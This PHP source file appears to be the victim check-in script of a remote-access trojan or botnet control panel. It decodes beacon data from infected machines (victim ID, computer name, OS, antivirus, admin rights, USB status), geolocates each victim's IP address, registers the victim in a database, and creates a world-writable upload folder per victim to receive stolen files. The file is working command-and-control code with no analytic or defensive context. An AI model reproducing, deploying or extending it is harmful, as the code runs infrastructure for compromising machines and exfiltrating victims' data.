<?php
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
include_once 'classes/Utils.php';

$utils = new Utils;

$client = new Clients;

$ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
$country = getConteryCode($ipaddress);
$date = date("Y-m-d");
$data = isset($_GET['data']) ? explode("|BN|", $utils->sanitize(base64_decode($_GET['data']))) : '';

$clientdata = [
    'vicid' => $data[0],
    'ip' => $ipaddress,
    'cpname' => $data[1],
    'cont' => $country,
    'os' => $data[2],
    'insdate' => $date,
    'update_at' => date("m/d/Y H:i:s", time()),
    'pings' => 0,
    'av' => $data[3],
    'stats' => $data[4],
    'usb' => $data[5],
    'admin' => $data[6]
];

$client->newClient($clientdata);
@new_dir(trim($data[0], "./"));

function getConteryCode($ipaddress)
{
    $utils = new Utils;
    $json = $utils->callAPI("GET", "http://www.geoplugin.net/json.gp?ip=" . $ipaddress, false);
    $data = json_decode($json);
    if ($data->geoplugin_countryCode == "") {
        return "X";
    } else {
        return strtolower($data->geoplugin_countryCode);
    }
}

function new_dir($victimID)
{
    try {
        @mkdir("upload/$victimID");
        @copy(realpath("upload/index.php"), "upload/$victimID/index.php");
        @copy(realpath("upload/.htaccess"), "upload/$victimID/.htaccess");
        @chmod("upload/$victimID", 0777);
    } catch (Exception $e) {
        return $e->getMessage();
    }
}
